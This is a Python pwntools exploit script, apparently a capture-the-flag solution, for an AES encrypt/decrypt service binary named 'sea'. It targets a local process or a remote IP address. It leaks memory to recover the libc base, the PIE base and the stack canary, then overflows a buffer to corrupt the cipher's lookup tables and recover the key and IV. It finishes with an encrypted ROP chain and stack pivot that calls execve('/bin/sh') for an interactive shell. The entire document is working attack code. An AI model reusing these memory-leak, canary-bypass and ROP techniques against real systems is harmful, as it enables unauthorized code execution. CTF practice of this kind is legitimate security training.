from pwn import *
from Crypto.Cipher import AES
from binascii import *
import sys
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
if len(sys.argv) == 1:
    p = process("./sea",env={'LD_PRELOAD':"./libc-2.31.so"})
    
else:
    p = remote("54.180.128.138", 45510)

ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
def cmd(c):
    sla(b"> ",str(c).encode())
def enc(c):
    cmd(1)
    sla(b": ",c.hex())
    ru(b": ")
    return binascii.unhexlify(p.recvuntil(b"\n")[:-1])
def dec(c):
    cmd(2)
    sla(b": ",c.hex())
    ru(b"plaintext: ")
    return binascii.unhexlify(p.recvuntil(b"\n")[:-1])
def data_overflow(data):
	cmd(2)
	p.sendlineafter(b"ciphertext (as a hexstring) : ", binascii.hexlify(data))
leak = dec(enc(b"A" * 0x10 + b'\x80' * 0x80)[:-0x10])
# for x in range(int(len(leak)//8)-1):
#     print(x)
#     info(hex(u64(leak[x*8:x*8+8])))
base = u64(leak[18*8:19*8])-(0x7ffff7e12a61-0x00007ffff7d86000)-(0x7ffff7f36cc2-0x00007ffff7dd6000)
canary = u64(leak[32*8:33*8])
pie = u64(leak[31*8:32*8])-(0x555555558820-0x0000555555554000)
info(hex(pie))
info(hex(base))

info(hex(canary))
libc=ELF("./libc-2.31.so")
libc.address = base
rop=ROP(libc)
rdi = rop.find_gadget(['pop rdi','ret'])[0]
rsi = rop.find_gadget(['pop rsi','ret'])[0]
rdx = rop.find_gadget(['pop rdx','ret'])[0]
rax = rop.find_gadget(['pop rax','ret'])[0]
ret = rop.find_gadget(['ret'])[0]
leave = 0x00000000000578c8+base

syscall = rop.find_gadget(['syscall','ret'])[0]
binsh = libc.search(b'/bin/sh').__next__()


# gdb.attach(p, "b *0x555555555849\n")
cmd(2)
sla(b": ",(b'A' * 288 + b'\x00' * (32 + 256 + 256 + 1)).hex())

kw = enc(b"A")
key = kw[0:8] + p32(u32(kw[8:12]) ^ u32(kw[0:4])) + p32(u32(kw[12:16]) ^ u32(kw[4:8]))





data_overflow( b"".ljust(288,b'A')+ b'\x8d\x01\x02\x04\x08\x10 @\x80\x1b6\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\tj\xd506\xa58\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe39\x82\x9b/\xff\x874\x8eCD\xc4\xde\xe9\xcbT{\x942\xa6\xc2#=\xeeL\x95\x0bB\xfa\xc3N\x08.\xa1f(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6d\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15FW\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3E\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11AOg\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact"\xe7\xad5\x85\xe2\xf97\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7b\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa83\x88\x07\xc71\xb1\x12\x10Y\'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99a\x17+\x04~\xbaw\xd6&\xe1i\x14cU!\x0c}c|w{\xf2ko\xc50\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc4\xa5\xe5\xf1q\xd81\x15\x04\xc7#\xc3\x18\x96\x05\x9a\x07\x12\x80\xe2\xeb\'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe9JLX\xcf\xd0\xef\xaa\xfbCM3\x85E\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d8\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\x0c\x13\xec_\x97D\x17\xc4\xa7~=d]\x19s`\x81O\xdc"*\x90\x88F\xee\xb8\x14\xde^\x0b\xdb\xe02:\nI\x06$\\\xc2\xd3\xacb\x91\x95\xe4y\xe7\xc87m\x8d\xd5N\xa9lV\xf4\xeaez\xae\x08\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5fH\x03\xf6\x0ea5W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6BhA\x99-\x0f\xb0T\xbb\x16\x01')

c = enc(b"A")
iv = bytes([a^b for a,b in zip(AES.new(key, AES.MODE_ECB).decrypt(c), b"A".ljust(16, b'\x0f'))])
print(binascii.hexlify(key), binascii.hexlify(iv))
# gdb.attach(p,'b *0x55555555573d')

aes = AES.new(key, AES.MODE_CBC, iv)
info(hex(leave))
rrr = flat([
    0x555555558020-0x0000555555554000+pie-8,0,leave,0
])
ropchain = flat([
    rdi,binsh,rsi,0,rdx,0,libc.sym['execve']
])
enc(aes.decrypt(AES.new(key, AES.MODE_CBC, iv).encrypt(ropchain.ljust(0xf0,b'\0')) + p64(canary) + cyclic(0x8)+rrr))

p.interactive()